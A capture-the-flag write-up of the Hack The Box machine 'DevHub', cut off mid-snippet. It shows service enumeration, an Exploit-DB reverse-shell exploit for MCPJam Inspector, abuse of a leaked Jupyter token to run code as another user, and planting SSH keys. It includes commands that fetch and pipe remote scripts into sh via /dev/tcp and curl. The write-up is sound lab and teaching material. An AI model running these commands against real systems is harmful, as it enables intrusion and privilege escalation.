## Description
DevHub is a medium difficulty Linux machine provided by HTB.

## Solution
Our target IP is 10.129.245.216.
### Service Scanning
At first I scanned the IP for all running services. 
```
nmap -sV -sC -p- -Pn 10.129.245.216
```
Result:
```
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-09 17:24 +0200
Nmap scan report for 10.129.245.216
Host is up (0.018s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
6274/tcp open  unknown
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest:
|     HTTP/1.1 200 OK
|     access-control-allow-credentials: true
|     content-length: 466
|     content-type: text/html; charset=utf-8
|     vary: Origin
|     Date: Wed, 09 Sep 2026 15:26:26 GMT
|     Connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <link rel="icon" type="image/svg+xml" href="/mcp_jam.svg" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
|     <title>MCPJam Inspector</title>
|     <script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
|     <link rel="stylesheet" crossorigin href="/assets/index-XvFRNbCs.css">
|     </head>
|     <body>
|     <div id="root"></div>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest:
|     HTTP/1.1 204 No Content
|     access-control-allow-credentials: true
|     access-control-allow-methods: GET,HEAD,PUT,POST,DELETE,PATCH
|     vary: Origin
|     content-type: text/plain; charset=UTF-8
|     Date: Wed, 09 Sep 2026 15:26:26 GMT
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6274-TCP:V=7.991%I=7%D=9/9%Time=6AA17AA2%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,290,"HTTP/1\.1\x20200\x20OK\r\naccess-control-allow-credential
SF:s:\x20true\r\ncontent-length:\x20466\r\ncontent-type:\x20text/html;\x20
SF:charset=utf-8\r\nvary:\x20Origin\r\nDate:\x20Wed,\x2009\x20Sep\x202026\
SF:x2015:26:26\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<
SF:html\x20lang=\"en\">\n\x20\x20<head>\n\x20\x20\x20\x20<meta\x20charset=
SF:\"UTF-8\"\x20/>\n\x20\x20\x20\x20<link\x20rel=\"icon\"\x20type=\"image/
SF:svg\+xml\"\x20href=\"/mcp_jam\.svg\"\x20/>\n\x20\x20\x20\x20<meta\x20na
SF:me=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\
SF:"\x20/>\n\x20\x20\x20\x20<title>MCPJam\x20Inspector</title>\n\x20\x20\x
SF:20\x20<script\x20type=\"module\"\x20crossorigin\x20src=\"/assets/index-
SF:DRYhT9Xb\.js\"></script>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x
SF:20crossorigin\x20href=\"/assets/index-XvFRNbCs\.css\">\n\x20\x20</head>
SF:\n\x20\x20<body>\n\x20\x20\x20\x20<div\x20id=\"root\"></div>\n\x20\x20<
SF:/body>\n</html>\n")%r(HTTPOptions,F0,"HTTP/1\.1\x20204\x20No\x20Content
SF:\r\naccess-control-allow-credentials:\x20true\r\naccess-control-allow-m
SF:ethods:\x20GET,HEAD,PUT,POST,DELETE,PATCH\r\nvary:\x20Origin\r\ncontent
SF:-type:\x20text/plain;\x20charset=UTF-8\r\nDate:\x20Wed,\x2009\x20Sep\x2
SF:02026\x2015:26:26\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPReques
SF:t,F0,"HTTP/1\.1\x20204\x20No\x20Content\r\naccess-control-allow-credent
SF:ials:\x20true\r\naccess-control-allow-methods:\x20GET,HEAD,PUT,POST,DEL
SF:ETE,PATCH\r\nvary:\x20Origin\r\ncontent-type:\x20text/plain;\x20charset
SF:=UTF-8\r\nDate:\x20Wed,\x2009\x20Sep\x202026\x2015:26:26\x20GMT\r\nConn
SF:ection:\x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP
SF:/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSS
SF:tatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x
SF:20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConn
SF:ection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 129.61 seconds
```
The server is running on Ubuntu Linux.

These services are running on the following ports:
- Port 6274: MCPJam on a web server.
- Port 22: SSH service via `OpenSSH` on version 8.9p1.
- Port 80: NGINX 1.18.0 web server.

### Web Enumeration
I investigated the website and found that the hostname is `devhub.htb` and the website states that a Jupyter dashboard is running locally on port 8888.
I added `devhub.htb` to my `/etc/hosts` file and performed a directory and subdomain scan with gobuster.

Directory scan:
```
> gobuster dir -u http://devhub.htb/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt                                                                                                                                   (base)
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://devhub.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.html           (Status: 200) [Size: 3396]
Progress: 4752 / 4752 (100.00%)
===============================================================
Finished
===============================================================
```

Subdomain scan:
```
> gobuster vhost -u http://devhub.htb/ -w /usr/share/SecLists/Discovery/DNS/namelist.txt --append-domain
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://devhub.htb/
[+] Method:                    GET
[+] Threads:                   10
[+] Wordlist:                  /usr/share/SecLists/Discovery/DNS/namelist.txt
[+] User Agent:                gobuster/3.8.2
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
http://enquetes.devhub.htb Status: 400 [Size: 166]
http://mobility.devhub.htb Status: 400 [Size: 166]
http://partner.devhub.htb Status: 400 [Size: 166]
https://archives.devhub.htb Status: 400 [Size: 166]
https://assurance.devhub.htb Status: 400 [Size: 166]
https://collaboratif.devhub.htb Status: 400 [Size: 166]
https://igc.devhub.htb Status: 400 [Size: 166]
https://conseil.devhub.htb Status: 400 [Size: 166]
https://idees.devhub.htb Status: 400 [Size: 166]
https://escale.devhub.htb Status: 400 [Size: 166]
https://ee.devhub.htb Status: 400 [Size: 166]
https://lvelizy.devhub.htb Status: 400 [Size: 166]
https://nomade.devhub.htb Status: 400 [Size: 166]
https://mobility.devhub.htb Status: 400 [Size: 166]
https://partner.devhub.htb Status: 400 [Size: 166]
https://pam.devhub.htb Status: 400 [Size: 166]
https://protocoltraining.devhub.htb Status: 400 [Size: 166]
https://sft.devhub.htb Status: 400 [Size: 166]
https://webpam.devhub.htb Status: 400 [Size: 166]
https://scm.devhub.htb Status: 400 [Size: 166]
https://www.devhub.htb Status: 400 [Size: 166]
Progress: 151265 / 151265 (100.00%)
===============================================================
Finished
===============================================================
```
There are no directories or usable subdomains.
### Exploitation: Remote Code Execution
Versions that I have found:
- OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
- NGINX 1.18.0
- MCPJam v1.4.2

I searched for exploits and found this one on Exploit-DB:
```
> searchsploit MCPJam                                                               
(devhub)
------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                    |  Path
------------------------------------------------------------------ ---------------------------------
MCPJam Inspector - Remote Code Execution                          | multiple/webapps/52625.py
------------------------------------------------------------------ ---------------------------------
```
Exploit-DB also links to the official CVE entry: [CVE-2026-23744](https://nvd.nist.gov/vuln/detail/cve-2026-23744). 
This vulnerability was patched with version 1.4.3 and should work because 1.4.2 < 1.4.3. The vulnerability type is remote code execution. 
#### [CVE-2026-23744](https://nvd.nist.gov/vuln/detail/cve-2026-23744)
This [Python script from Exploit-DB](https://www.exploit-db.com/exploits/52625) plants a reverse shell on a given IP and port. 

I planted the reverse shell on the server:
```
> python3 exploit.py -u http://10.129.245.216:6274/ -l 10.10.16.131 -p 4444 
```
Listened on the client:
```
> nc -lvnp 4444

Listening on 0.0.0.0 4444
Connection received on 10.129.245.216 55814
bash: cannot set terminal process group (1037): Inappropriate ioctl for device
bash: no job control in this shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
```
The exploit worked and I successfully connected to the shell with the user mcp-dev.
### Host Enumeration: (User: mcp-dev)
I searched for useful files in the mcpjam directory and found nothing of use.
```
> mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ ls -la

total 48
drwxr-xr-x 6 root root 4096 Jan 22  2026 .
drwxr-xr-x 3 root root 4096 Jan 22  2026 ..
-rw-r--r-- 1 root root  334 Jan 22  2026 .env.production
-rw-r--r-- 1 root root  973 Jan 22  2026 LICENSE
-rw-r--r-- 1 root root 7642 Jan 22  2026 README.md
drwxr-xr-x 2 root root 4096 Jan 22  2026 assets
drwxr-xr-x 2 root root 4096 Jan 22  2026 bin
drwxr-xr-x 5 root root 4096 Jan 22  2026 dist
drwxr-xr-x 3 root root 4096 Jan 22  2026 node_modules
-rw-r--r-- 1 root root 7154 Jan 22  2026 package.json
```
Afterwards I uploaded linPEAS and tried to gather more useful information.

Client:
```
sudo nc -q 5 -lvnp 80 < linpeas.sh
```
Web Server:
```
cat < /dev/tcp/10.10.16.131/80 | sh
```

Useful output:
```
╔══════════╣ PATH (T1574.007)
╚ https://book.hacktricks.wiki/en/linux-hardening/linux-basics/linux-privilege-escalation/index.html#writable-path-abuses
/opt/mcpjam/node_modules/.bin:/opt/node_modules/.bin:/node_modules/.bin:/usr/lib/node_modules/npm/node_modules/@npmcli/run-script/lib/node-gyp-bin:/opt/mcpjam/node_modules/.bin:/opt/node_modules/.bin:/node_modules/.bin:/usr/lib/node_modules/npm/node_modules/@npmcli/run-script/lib/node-gyp-bin:/usr/local/bin:/usr/bin:/bin:/snap/bin


╔══════════╣ Kernel Exploit Registry (T1068)
═╣ Operating system ............. Linux
═╣ Kernel release ............... 5.15.0-179-generic
═╣ Comparable version ........... 5.15.0.179
═╣ Data chunk limit ............. max 25 rows per KERNEL_CVE_DATA_* variable (1..24)
═╣ Kernel config source ......... /boot/config-5.15.0-179-generic
CVE: CVE-2022-0847 | Name: DirtyPipe | Match data: pkg=linux-kernel,ver>=5.8,ver<=5.16.11 | Tags: ubuntu=(20.04|21.04),debian=11 | Rank: 1
CVE: CVE-2022-0995 | Name: watch_queue | Match data: pkg=linux-kernel,ver>=5.8,ver<5.16.5,x86_64 | Tags: ubuntu=21.10{kernel:5.13.0.37-generic} | Rank: 1 | Details: Not 100% reliable, may need to be run a couple of times. It rare cases it may panic the kernel.
CVE: CVE-2025-38236 | Name: AF_UNIX MSG_OOB UAF | Match data: pkg=linux-kernel,ver>=5.15,ver<6.1.143 | Tags: 1 | Rank: Fixed in stable 6.1.143
CVE: CVE-2026-43503 | Name: DirtyClone | Match data: pkg=linux-kernel,ver>=5.11,ver<5.15.208 | Tags: 1 | Rank: Fixed in stable 5.15.208; exploit path is in the networking stack and may be mitigated by removing the relevant ESP modules
CVE: CVE-2026-43499 | Name: GhostLock rtmutex UAF | Match data: pkg=linux-kernel,ver>=5.11,ver<5.15.212,CONFIG_FUTEX_PI=y | Tags: 1 | Rank: Fixed in stable 5.15.212; priority-inheritance futexes must be enabled
═╣ Kernel vulns found: 5


╔══════════╣ Checking for Dirty Frag (CVE-2026-43284 / CVE-2026-43500) (T1068)
╚ https://ubuntu.com/blog/dirty-frag-linux-vulnerability-fixes-available
╚ https://www.cve.org/CVERecord?id=CVE-2026-43284
╚ https://www.cve.org/CVERecord?id=CVE-2026-43500
CVE-2026-43284 (xfrm-ESP): autoloadable: esp4 esp6 xfrm_user ipcomp6
CVE-2026-43500 (rxrpc): autoloadable: rxrpc
modprobe mitigation (xfrm-ESP): present
modprobe mitigation (rxrpc): present
Unprivileged user namespaces: disabled (breaks the public PoC)
Kernel build predates upstream fix (2026-05-08): likely unpatched unless distro backport.


╔══════════╣ Active Ports (T1049)
╚ https://book.hacktricks.wiki/en/linux-hardening/linux-basics/linux-privilege-escalation/index.html#open-ports
══╣ Active Ports (netstat) (T1049)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:6274            0.0.0.0:*               LISTEN      1292/node
tcp6       0      0 :::22                   :::*                    LISTEN      -
══╣ Local-only listeners (loopback) (T1049)
tcp   LISTEN 0      128        127.0.0.1:8888      0.0.0.0:*
tcp   LISTEN 0      128        127.0.0.1:5000      0.0.0.0:*
══╣ Unique listener bind addresses (T1049)
0.0.0.0
127.0.0.1
127.0.0.53%lo
::
══╣ Potential local forwarders/relays (T1049)
mcp-dev    39920  0.0  0.0   3688  1080 ?        S    23:36   0:00 sed -E s,socat|ssh|-L|-R|-D|ncat|nc,.[1;31;103m&.[0m,g


══╣ Set-capabilities snap-confine (CVE-2026-8933) (T1068)
╚ https://ubuntu.com/security/CVE-2026-8933
/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
Vulnerable to CVE-2026-8933: set-capabilities snap-confine version 2.75.2+ubuntu22.04 permits local privilege escalation to root
/snap/snapd/current/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
Vulnerable to CVE-2026-8933: set-capabilities snap-confine version 2.75.2 permits local privilege escalation to root


╔══════════╣ Searching *password* or *credential* files in home (limit 70) (T1552.001)
/etc/pam.d/common-password
/opt/mcpjam/node_modules/@auth/core/providers/credentials.d.ts
/opt/mcpjam/node_modules/@auth/core/providers/credentials.d.ts.map
/opt/mcpjam/node_modules/@auth/core/providers/credentials.js
/opt/mcpjam/node_modules/@auth/core/src/providers/credentials.ts
/opt/mcpjam/node_modules/@radix-ui/react-one-time-password-field
/opt/mcpjam/node_modules/@radix-ui/react-one-time-password-field/src/one-time-password-field.test.tsx
/opt/mcpjam/node_modules/@radix-ui/react-one-time-password-field/src/one-time-password-field.tsx
/opt/mcpjam/node_modules/@radix-ui/react-password-toggle-field
/opt/mcpjam/node_modules/@radix-ui/react-password-toggle-field/src/password-toggle-field.test.tsx
/opt/mcpjam/node_modules/@radix-ui/react-password-toggle-field/src/password-toggle-field.tsx
/opt/mcpjam/node_modules/caniuse-lite/data/features/credential-management.js
/opt/mcpjam/node_modules/caniuse-lite/data/features/passwordrules.js
/opt/mcpjam/node_modules/simple-icons/icons/1password.svg
/usr/bin/systemd-ask-password
/usr/bin/systemd-tty-ask-password-agent
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/python3/dist-packages/keyring/__pycache__/credentials.cpython-310.pyc
/usr/lib/python3/dist-packages/keyring/credentials.py
/usr/lib/python3/dist-packages/launchpadlib/__pycache__/credentials.cpython-310.pyc
/usr/lib/python3/dist-packages/launchpadlib/credentials.py
/usr/lib/python3/dist-packages/launchpadlib/tests/__pycache__/test_credential_store.cpython-310.pyc
/usr/lib/python3/dist-packages/launchpadlib/tests/test_credential_store.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-310.pyc
```

Before I investigated the linPEAS output further I wanted to gather information about the advertised Jupyter dashboard server that runs locally. At first I searched for the process to see if the server really exists.
```
ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...SNIP...
/home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=[REDACTED TOKEN] --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
...SNIP...
```

The Python server exists and operates in "/home/analyst/jupyter-env/". 
The paths that were provided in the process:
- /home/analyst/jupyter-env/bin/python3
- /home/analyst/jupyter-env/bin/jupyter-lab
- notebook-dir=/home/analyst/notebooks
The server app token is: `[REDACTED TOKEN]`.

I don't have access to these folders, because my user has no access to "/home/analyst/", but I can communicate with the server and I do have its token. I found out how that token is being used from the official [Jupyter Server](https://jupyter-server.readthedocs.io/en/latest/operators/security.html) documentation.
```
> TOKEN = [REDACTED TOKEN]
> curl -L -v "http://127.0.0.1:8888/?token=$TOKEN"

...SNIP...
{ [4592 bytes data]
<!doctype html><html lang="en"><head><meta charset="utf-8"><title>JupyterLab</title><meta name="viewport" content="width=device-width,initial-scale=1">   <script id="jupyter-config-data" type="application/json">{"allow_hidden_files": false, "appName": "JupyterLab", "appNamespace": "lab", "appSettingsDir": "/home/analyst/jupyter-env/share/jupyter/lab/settings", "appUrl": "/lab", "appVersion": "4.5.2", "baseUrl": "/", "buildAvailable": true, "buildCheck": true, "cacheFiles": false, "copyAbsolutePath": false, "delete_to_trash": true, "devMode": false, "disabledExtensions": [], "exposeAppInBrowser": false, "extensionManager": {"can_install": true, "install_path": "/home/analyst/jupyter-env", "name": "PyPI"}, "extraLabextensionsPath": [], "federated_extensions": [{"entrypoints": null, "extension": "./extension", "load": "static/remoteEntry.5cbb9d2323598fbda535.js", "name": "jupyterlab_pygments", "style": "./style"}, {"entrypoints": null, "extension": "./extension", "load": "static/remoteEntry.fc1011a4f389fd607c52.js", "name": "@jupyter-notebook/lab-extension", "style": "./style"}, {"entrypoints": null, "extension": "./extension", "load": "static/remoteEntry.9077b3d2deaffb329dfc.js", "name": "@jupyter-widgets/jupyterlab-manager"}], "fullAppUrl": "/lab", "fullLabextensionsUrl": "/lab/extensions", "fullLicensesUrl": "/lab/api/licenses", "fullListingsUrl": "/lab/api/listings", "fullMathjaxUrl": "https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js", "fullSettingsUrl": "/lab/api/settings", "fullStaticUrl": "/static/lab", "fullThemesUrl": "/lab/api/themes", "fullTranslationsApiUrl": "/lab/api/translations", "fullTreeUrl": "/lab/tree", "fullWorkspacesApiUrl": "/lab/api/workspaces", "ignorePlugins": [], "labextensionsPath": ["/home/analyst/jupyter-env/share/jupyter/labextensions", "/home/analyst/.local/share/jupyter/labextensions", "/usr/local/share/jupyter/labextensions", "/usr/share/jupyter/labextensions"], "labextensionsUrl": "/lab/extensions", "licensesUrl": "/lab/api/licenses", "listingsUrl": "/lab/api/listings", "mathjaxConfig": "TeX-AMS_HTML-full,Safe", "mode": "multiple-document", "nbclassic_enabled": false, "news": {"disabled": false}, "notebookStartsKernel": true, "notebookVersion": "[2, 17, 0]", "preferredPath": "/", "quitButton": true, "rootUri": "file:///home/analyst/notebooks", "schemasDir": "/home/analyst/jupyter-env/share/jupyter/lab/schemas", "serverRoot": "~/notebooks", "settingsUrl": "/lab/api/settings", "staticDir": "/home/analyst/jupyter-env/share/jupyter/lab/static", "store_id": 0, "templatesDir": "/home/analyst/jupyter-env/share/jupyter/lab/static", "terminalsAvailable": true, "themesDir": "/home/analyst/jupyter-env/share/jupyter/lab/themes", "themesUrl": "/lab/api/themes", "token": "[REDACTED TOKEN]", "translationsApiUrl": "/lab/api/translations", "treePath": "", "treeUrl": "/lab/tree", "untracked_message_types": ["comm_info_request", "comm_info_reply", "kernel_info_request", "kernel_info_reply", "shutdown_request", "shutdown_reply", "interrupt_request", "interrupt_reply", "debug_request", "debug_reply", "stream", "display_data", "update_display_data", "execute_input", "execute_result", "error", "status", "clear_output", "debug_event", "input_request", "input_reply"], "userSettingsDir": "/home/analyst/.jupyter/lab/user-settings", "virtualDocumentsUri": "file:///home/analyst/notebooks/.virtual_documents", "workspace": "default", "workspacesApiUrl": "/lab/api/workspaces", "workspacesDir": "/home/analyst/.jupyter/lab/workspaces", "wsUrl": ""}</script><link rel="icon" type="image/x-icon" href="/static/favicons/favicon.ico" class="idle favicon"><link rel="" type="image/x-icon" href="/static/favicons/favicon-busy-1.ico" class="busy favicon"> <script defer="defer" src="/static/lab/main.8b2c3d9cdc9b5f4bb9a6.js?v=8b2c3d9cdc9b5f4bb9a6"></script></head><body class="jp-ThemedContainer"><script>/* Remove token from URL. */
  (function () {
    var location = window.location;
    var search = location.search;

    // If there is no query string, bail.
    if (search.length <= 1) {
100  4592  100  4592    0     0   223k      0 --:--:-- --:--:-- --:--:--  223k
* Connection #0 to host 127.0.0.1 left intact
turn;
    }

    // Rebuild the query string without the `token`.
    var query = '?' + search.slice(1).split('&')
      .filter(function (param) { return param.split('=')[0] !== 'token'; })
      .join('&');

    // Rebuild the URL with the new query string.
    var url = location.origin + location.pathname +
      (query !== '?' ? query : '') + location.hash;

    if (url === location.href) {
      return;
    }

    window.history.replaceState({ }, '', url);
  })();</script></body></html>
```
After sending a request to the Jupyter server with the token at the default endpoint I got this response. Several other API endpoints are listed in the response.

The contents of the Jupyter server:
```
> curl -L -v "http://localhost:8888/api/contents?token=$TOKEN"
...
{"name": "", "path": "", "last_modified": "2026-05-26T08:42:22.462480Z", "created": "2026-05-26T08:42:22.462480Z", "content": [{"name": "quarterly_analysis.ipynb", "path": "quarterly_analysis.ipynb", "last_modified": "2026-01-22T15:06:49.961594Z", "created": "2026-05-26T08:42:21.153593Z", "content": null, "format": null, "mimetype": null, "size": 556, "writable": true, "hash": null, "hash_algorithm": null, "type": "notebook"}], "format": "json", "mimetype": null, "size": null, "writable": true, "hash": null, "hash_algorithm": null, "type": "directory"}
```

There is a notebook named "quarterly_analysis.ipynb".
```
> curl -L -v "http://localhost:8888/api/contents/quarterly_analysis.ipynb?token=$TOKEN"
...
{"name": "quarterly_analysis.ipynb", "path": "quarterly_analysis.ipynb", "last_modified": "2026-01-22T15:06:49.961594Z", "created": "2026-05-26T08:42:21.153593Z", "content": {"cells": [{"cell_type": "markdown", "metadata": {}, "source": "# Q4 2025 Analytics Report\nInternal data analysis for DevHub metrics"}, {"cell_type": "code", "execution_count": null, "metadata": {"trusted": false}, "outputs": [], "source": "import pandas as pd\nimport numpy as np\n# Load internal metrics\n# data = pd.read_csv('/data/metrics.csv')"}], "metadata": {"kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"}}, "nbformat": 4, "nbformat_minor": 4}, "format": "json", "mimetype": null, "size": 556, "writable": true, "hash": null, "hash_algorithm": null, "type": "notebook"}
```

```
> curl -L -v "http://localhost:8888/api/me?token=$TOKEN"
...
{"identity": {"username": "3e26fcaa08a442f2bb7857be62ad6ed2", "name": "Anonymous Valetudo", "display_name": "Anonymous Valetudo", "initials": "AV", "avatar_url": null, "color": null}, "permissions": {"updatable_fields": ["name", "display_name", "initials", "avatar_url", "color"]}}
```

### Exploitation: Privilege Escalation (User analyst)

I created an SSH connection with the user mcp-dev. Afterwards I started and connected to a Jupyter kernel using the official [Jupyter REST API documentation](https://jupyter-server.readthedocs.io/en/latest/developers/rest-api.html). I opened the existing Jupyter notebook "quarterly_analysis.ipynb" and wrote Python code in a cell to create a reverse shell. 

On my client:
```
> ssh-keygen -t ed25519

> cat ~/.ssh/id_ed25519.pub                                                        
ssh-ed25519 [REDACTED PUBLIC KEY] tolga@pc
```
On the server:
```
mcp-dev@devhub:~/.ssh$ echo "
> ssh-ed25519 [REDACTED PUBLIC KEY] tolga@pc" >> authorized_keys
 
> chmod 600 ~/.ssh/authorized_keys
```
The `SSH` connection worked. Starting the Jupyter kernel:
```
curl -X POST \
  "http://localhost:8888/api/kernels?token=$TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "python3",
    "path": ""
  }'
```
Connecting to the kernel with the token via authentication page:

![authentication](assets/1.png)

The Jupyter session:

![session](assets/2.png)

I verified which user I was:

![whoami](assets/3.png)

After I verified that I was the user analyst, I planted a reverse shell:

![reverse-shell](assets/4.png)

I connected via `SSH` as analyst.

On the reverse shell as the analyst user:
```
> ls -la
 
total 56
drwxr-x--- 9 analyst analyst 4096 May 27 12:22 .
drwxr-xr-x 4 root    root    4096 Mar 16 21:25 ..
-rw------- 1 analyst analyst    0 May 27 12:22 .bash_history
-rw-r--r-- 1 analyst analyst  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 analyst analyst 3771 Jan  6  2022 .bashrc
drwx------ 2 analyst analyst 4096 Jan 22  2026 .cache
drwxr-xr-x 3 analyst analyst 4096 May 26 08:42 .ipython
drwxr-xr-x 3 analyst analyst 4096 Sep 10 10:21 .jupyter
drwxr-xr-x 7 analyst analyst 4096 Jan 22  2026 jupyter-env
lrwxrwxrwx 1 root    root       9 Jan 23  2026 .lesshst -> /dev/null
drwxr-xr-x 3 analyst analyst 4096 Jan 22  2026 .local
lrwxrwxrwx 1 root    root       9 Jan 23  2026 .node_repl_history -> /dev/null
drwxr-xr-x 3 analyst analyst 4096 Sep 10 10:29 notebooks
drwxr-xr-x 3 analyst analyst 4096 Jan 22  2026 .npm
-rw------- 1 analyst analyst   35 Mar 16 21:49 .opsmcp_key
-rw-r--r-- 1 analyst analyst  807 Jan  6  2022 .profile
lrwxrwxrwx 1 root    root       9 Jan 23  2026 .python_history -> /dev/null
-rw-r----- 1 root    analyst   33 Sep 10 08:18 user.txt
lrwxrwxrwx 1 root    root       9 Jan 23  2026 .viminfo -> /dev/null

> mkdir -p ~/.ssh
> chmod 700 ~/.ssh
> cd ~/.ssh
> echo "ssh-ed25519 [REDACTED PUBLIC KEY] tolga@pc" > authorized_keys
> chmod 600 ~/.ssh/authorized_keys
```
On the client:
```
> ssh analyst@10.129.245.216           
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)

> cat ~/user.txt
[REDACTED FLAG]
```
I connected and got the user flag.

### Host Enumeration (User: analyst)
At first I ran linPEAS as the user analyst.

On my client:
```
sudo python3 -m http.server 80
```

On the target:
```
curl 10.10.16.131/linpeas.sh | sh
```

Useful information that I could gather with linPEAS:
```
lrwxrwxrwx 1 root root 33 Jan 22  2026 /etc/nginx/sites-enabled/devhub -> /etc/nginx/sites-available/devhub
server {
    listen 80;
    server_name devhub.htb;
    root /var/www/devhub;
    index index.html;
    location / {
        try_files $uri $uri/ =404;
    }
    if ($host != devhub.htb) {
        rewrite ^ http://devhub.htb/;
    }
}

══╣ Set-capabilities snap-confine (CVE-2026-8933) (T1068)
╚ https://ubuntu.com/security/CVE-2026-8933
/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
Vulnerable to CVE-2026-8933: set-capabilities snap-confine version 2.75.2+ubuntu22.04 permits local privilege escalation to root
/snap/snapd/current/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_setgid,cap_setuid,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin,cap_sys_resource=p
Vulnerable to CVE-2026-8933: set-capabilities snap-confine version 2.75.2 permits local privilege escalation to root


═════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
                ╚════════════════════════════════════════════════╝
╔══════════╣ Running processes (cleaned) (T1057)
╚ Check weird & unexpected processes run by root: https://book.hacktricks.wiki/en/linux-hardening/linux-basics/linux-privilege-escalation/index.html#processes
...SNIP...
root        1082  0.0  0.0   6896  2844 ?        Ss   08:17   0:00 /usr/sbin/cron -f -P
root        1083  0.0  0.7  37376 28740 ?        Ss   08:17   0:02 /home/manalyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
root        1097  0.0  0.0   6176  1060 tty1     Ss+  08:17   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
...SNIP...
```
The MCP server `server.py` is running as root and is owned by the user analyst. The server is also writable and readable by us.
```
-rw-r----- 1 analyst analyst 6021 Mar 16 21:49 /opt/opsmcp/server.py
```

After some digging I found the following code snippet in "/opt/opsmcp/server.py":
```
        if target == "ssh_keys":
            try:
                with open('/root/.ssh/id_rsa', 'r') as f:
                    key_data = f.read()
                return jsonify({
